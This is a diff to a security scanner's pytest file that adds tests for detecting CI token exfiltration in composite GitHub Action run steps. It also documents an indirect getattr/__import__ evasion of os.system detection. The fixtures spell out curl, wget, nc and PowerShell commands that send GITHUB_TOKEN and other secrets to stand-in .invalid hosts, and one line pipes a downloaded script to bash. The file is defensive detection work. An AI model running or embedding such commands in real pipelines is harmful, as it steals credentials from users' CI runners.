@@ -1,9 +1,14 @@
-"""Ruleset 69: a detection gap a blind red-team found (2026-10-10).
+"""Ruleset 69: the last two detection gaps a blind red-team found (2026-10-10).
 
 Gap A — a dangerous callable or a module reached through a name that was bound to a
 ``getattr`` / ``__import__`` / ``importlib.import_module`` result, then called later in the same
 scope (``f = getattr(os, "system"); f(cmd)`` / ``m = __import__("os"); m.system(cmd)``). The
 direct one-expression forms resolved since ruleset 65; the two-statement form did not.
+
+Gap B — a composite GitHub Action ``run:`` step that sends a CI token (``GITHUB_TOKEN``,
+``ACTIONS_RUNTIME_TOKEN``, ``ACTIONS_ID_TOKEN_REQUEST_TOKEN``, ``${{ secrets.* }}``,
+``${{ github.token }}``) to a non-GitHub host through a network client — credential exfiltration
+on the runner of whoever uses the action.
 
 Each gap is pinned by a sample that fails on ruleset 68 and by the near-misses that must stay
 clean. Sanitized fixtures only: hosts are ``.invalid``, commands are inert, nothing is executed.
@@ -17,7 +22,7 @@ from pathlib import Path
 import pytest
 
 from skilltotal.engine import analyze_directory
-from skilltotal.models import Component
+from skilltotal.models import Component, ThreatClass
 
 
 def _report(root: Path):
@@ -201,3 +206,114 @@ def test_the_bound_name_pass_is_linear(tmp_path: Path):
     body = "".join(f"a{i} = getattr(os, 'path')\n" for i in range(5_000))
     index = _one_file(tmp_path, "big.py", "import os\n" + body + "a0.join('x')\n")
     _timed(lambda: PythonAstScanner().scan(index))
+
+
+# =====================================================================================
+# Gap B — a CI token sent to a non-GitHub host from a composite action run step
+# =====================================================================================
+
+_RULE = "ST-ACTION-SECRET-EXFIL"
+_HEAD = (
+    "name: t\ndescription: d\nruns:\n  using: composite\n  steps:\n"
+    "    - shell: bash\n      run: "
+)
+_PWSH = (
+    "name: t\ndescription: d\nruns:\n  using: composite\n  steps:\n"
+    "    - shell: pwsh\n      run: "
+)
+
+
+@pytest.mark.parametrize(
+    "run",
+    [
+        'curl -X POST -d "$GITHUB_TOKEN" https://ci-metrics.invalid/c',
+        'curl -H "Authorization: Bearer $GITHUB_TOKEN" https://collect.invalid/x',
+        'wget --post-data "token=${{ github.token }}" https://collect.invalid/',
+        'curl "https://exfil.invalid/?t=${{ secrets.NPM_TOKEN }}"',
+        'curl -d "$ACTIONS_RUNTIME_TOKEN" https://collect.invalid/a',
+        'curl -d "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" https://collect.invalid/o',
+        'nc collect.invalid 443 <<< "$GITHUB_TOKEN"',
+    ],
+)
+def test_a_ci_token_sent_to_a_foreign_host_is_action_secret_exfil(tmp_path: Path, run: str):
+    report = _report(_write(tmp_path, {"action.yml": _HEAD + run + "\n"}))
+    ids = {f.id for f in report.findings}
+    assert _RULE in ids
+    f = next(f for f in report.findings if f.id == _RULE)
+    assert f.threat_class == ThreatClass.MALICIOUS_INDICATOR
+    assert f.evidence[0].file == "action.yml"
+
+
+def test_a_ci_token_exfil_in_powershell_is_detected(tmp_path: Path):
+    run = "Invoke-WebRequest -Uri https://collect.invalid/x -Body $env:GITHUB_TOKEN"
+    assert _RULE in _ids(_write(tmp_path, {"action.yml": _PWSH + run + "\n"}))
+
+
+def test_a_block_scalar_token_exfil_is_detected(tmp_path: Path):
+    yml = (
+        "name: t\ndescription: d\nruns:\n  using: composite\n  steps:\n"
+        "    - shell: bash\n      run: |\n"
+        "        echo start\n"
+        '        curl -sS -d "$GITHUB_TOKEN" https://collect.invalid/c\n'
+    )
+    assert _RULE in _ids(_write(tmp_path, {"action.yml": yml}))
+
+
+@pytest.mark.parametrize(
+    "run",
+    [
+        # the token goes to the GitHub API, which is where it belongs
+        'curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/o/r/issues',
+        # pushing to GitHub with the token in the URL
+        "git push https://x-access-token:${{ github.token }}@github.com/o/r HEAD:main",
+        # the GitHub CLI, not a generic network client
+        'gh api -H "Authorization: token $GITHUB_TOKEN" /repos/o/r/releases',
+        # downloading a tool from GitHub releases, no token in the request
+        "curl -fsSL -o tool https://github.com/o/tool/releases/download/v1/tool-linux",
+        # the token is only masked in the log, never sent
+        'echo "::add-mask::$GITHUB_TOKEN"',
+        # a network client to a foreign host, but with no secret in that command
+        "curl -fsSL https://get.example.invalid/install.sh | bash",
+        # the token reaches GitHub infra through its documented URL env var
+        'curl -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RESULTS_URL/twirp/x"',
+    ],
+)
+def test_action_secret_exfil_near_misses_stay_clean(tmp_path: Path, run: str):
+    assert _RULE not in _ids(_write(tmp_path, {"action.yml": _HEAD + run + "\n"}))
+
+
+def test_a_token_used_by_gh_and_a_curl_elsewhere_stays_clean(tmp_path: Path):
+    # The token is handed to gh (legitimate); a separate curl to a foreign host carries no secret.
+    yml = (
+        "name: t\ndescription: d\nruns:\n  using: composite\n  steps:\n"
+        "    - shell: bash\n      run: |\n"
+        '        gh api -H "Authorization: token $GITHUB_TOKEN" /repos/o/r > meta.json\n'
+        "        curl -fsSL https://get.example.invalid/x.sh -o x.sh\n"
+    )
+    assert _RULE not in _ids(_write(tmp_path, {"action.yml": yml}))
+
+
+def test_a_multiline_github_api_call_with_the_token_stays_clean(tmp_path: Path):
+    # The curl is written across lines with shell line-continuations; the token and the GitHub
+    # host must be read as one command, not split into a secret-only segment and a host-only one.
+    yml = (
+        "name: t\ndescription: d\nruns:\n  using: composite\n  steps:\n"
+        "    - shell: bash\n      run: |\n"
+        '        curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" \\\n'
+        '          -d \'{"body":"ok"}\' \\\n'
+        '          "https://api.github.com/repos/o/r/issues/1/comments"\n'
+    )
+    assert _RULE not in _ids(_write(tmp_path, {"action.yml": yml}))
+
+
+def test_action_secret_exfil_does_not_fire_outside_a_composite_action(tmp_path: Path):
+    # A plain shell script with $GITHUB_TOKEN is not a composite action run step; this rule is
+    # scoped to action.yml, where the step runs on a consumer's runner.
+    sh = '#!/bin/bash\ncurl -d "$GITHUB_TOKEN" https://collect.invalid/c\n'
+    assert _RULE not in _ids(_write(tmp_path, {"deploy.sh": sh}))
+
+
+def test_the_action_secret_exfil_pass_is_linear(tmp_path: Path):
+    run = "echo " + "a" * 40000 + ' ; curl -d "$GITHUB_TOKEN" https://collect.invalid/c'
+    yml = _HEAD + run + "\n"
+    _timed(lambda: _ids(_write(tmp_path, {"action.yml": yml})))
